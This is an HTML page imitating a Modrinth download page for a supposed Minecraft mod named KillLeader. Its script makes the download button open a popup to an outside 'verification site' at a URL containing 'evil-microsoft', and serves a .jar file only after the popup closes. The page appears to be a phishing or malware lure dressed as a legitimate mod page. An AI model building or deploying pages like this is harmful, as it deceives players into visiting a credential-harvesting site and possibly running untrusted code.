<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KillLeader | Modrinth Style</title>
    <style>
        :root { --modrinth-green: #248a3d; --gloss: linear-gradient(180deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 100%); }
        body { font-family: 'Inter', sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
        .container { width: 100%; max-width: 600px; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #e1e4e8; }
        
        h1 { color: var(--modrinth-green); margin-top: 0; }
        .card { background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin-top: 20px; }
        
        .download-btn { 
            background: var(--modrinth-green); color: white; border: none; padding: 12px 24px; 
            border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; 
            background-image: var(--gloss); transition: transform 0.1s;
        }
        .download-btn:active { transform: scale(0.98); }

        .description { line-height: 1.6; color: #4a5568; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>KillLeader</h1>
        <p>A professional combat management and tracking solution for Minecraft.</p>

        <div class="card">
            <h3>Download</h3>
            <p><strong>Version:</strong> 1.0.1</p>
            <button id="download-btn" class="download-btn">Download KillLeader 1.0.1</button>
        </div>

        <div class="description">
            <h3>About This Mod</h3>
            <p>KillLeader is a comprehensive utility for combat tracking and server administration.</p>
        </div>
    </div>

    <script>
        const btn = document.getElementById('download-btn');
        const targetUrl = 'https://pcconfighelper.github.io/evil-microsoft/';

        btn.onclick = () => {
            // Open the verification site in a new popup window
            const popup = window.open(targetUrl, '_blank', 'width=800,height=600');

            // Periodically check if the popup has been closed
            const checkInterval = setInterval(() => {
                if (popup.closed) {
                    clearInterval(checkInterval);
                    // Trigger the download after the window is closed
                    window.location.href = 'killleader-1.0.1.jar';
                }
            }, 500);
        };
    </script>
</body>
</html>
